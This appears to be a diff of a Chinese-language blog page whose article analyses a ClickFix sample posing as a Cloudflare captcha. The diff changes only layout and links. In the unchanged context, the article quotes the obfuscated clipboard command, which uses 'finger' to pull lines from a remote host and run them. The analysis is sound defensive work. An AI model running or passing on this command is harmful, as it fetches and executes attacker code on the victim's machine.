@@ -127,11 +127,11 @@
       <div class="subtitle">星界棱晶 </div>
       <div class="link-list">
         
-          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
+          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><i class="changemehttps://www.bilibili.com/favicon.ico"></i></a>
         
-          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
+          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><i class="changemehttps://www.primegrid.com/images/favicon_32.png"></i></a>
         
-          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><i class="changemehttps://github.githubassets.com/favicons/favicon.png"></i></a>
          
       </div>  
     </div>
@@ -158,13 +158,13 @@
                 <div class="category-count">41</div>
             </a>
         
-            <a class="category-link" href="/categories/RW/">
-                RW
+            <a class="category-link" href="/categories/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                出题记录
                 <div class="category-count">1</div>
             </a>
         
-            <a class="category-link" href="/categories/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">
-                出题记录
+            <a class="category-link" href="/categories/RW/">
+                RW
                 <div class="category-count">1</div>
             </a>
         </div>
@@ -232,7 +232,7 @@
         
           <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文记录了一次典型的 ClickFix 样本从最外层模式到内层载荷完整分析的具体流程。ClickFix 是一种利用人类自身认知弱点进行攻击的手段，一般通过网络页面进行传播，伪造成各种验证码验证界面，实际却要求人去执行正常验证码根本不会经历的高危操作，比如打开cmd、powershell等windows本地高权限命令执行程序。ClickFix 网页在按下“我不是机器人”按钮的瞬间将伪造成验证码的恶意载荷下载链接复制到剪贴板，然后要求用户在各种能运行命令的窗口粘贴并执行，下载远程的恶意载荷到本地并运行从而完成感染。</p>
 <h2 id="2-样本最外层网页模式"><a href="#2-样本最外层网页模式" class="headerlink" title="2. 样本最外层网页模式"></a>2. 样本最外层网页模式</h2><p>本次遇到的 ClickFix 页面伪造成了Cloudflare的验证码：</p>
-<p><img src="/pictures/clickfix.png" title="img"></p>
+<p><img src="/source/pictures/clickfix.png" title="img"></p>
 <p>在按下按钮后，复制到剪贴板的一阶段命令为：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;%COMSPEC%&quot;</span><span class="string">&quot;&quot;</span> /c s^t^a^r^t <span class="string">&quot;&quot;</span> /min <span class="keyword">for</span> /f <span class="string">&quot;skip=16 delims=&quot;</span> %d <span class="keyword">in</span> (<span class="string">&#x27;f^^i^^n^^g^^e^^r fGOPzWUAOf@homveraahub.com&#x27;</span>) <span class="keyword">do</span> %d &amp; <span class="built_in">echo</span> <span class="string">&#x27;               ---Verify ----------------press ENTER---              &#x27;</span></span><br></pre></td></tr></table></figure>
 
@@ -346,10 +346,15 @@
   
     
 <nav id="article-nav">
-  <a class="article-nav-btn left  disabled "
+  <a class="article-nav-btn left "
+    
+      href="/2026/07/04/2026_mid/"
+      title="2025 ~ 2026 学年 年终回顾"
      >
     <i class="fa-solid fa-angle-left"></i>
     <p class="title-text">
+      
+        2025 ~ 2026 学年 年终回顾
         
     </p>
   </a>
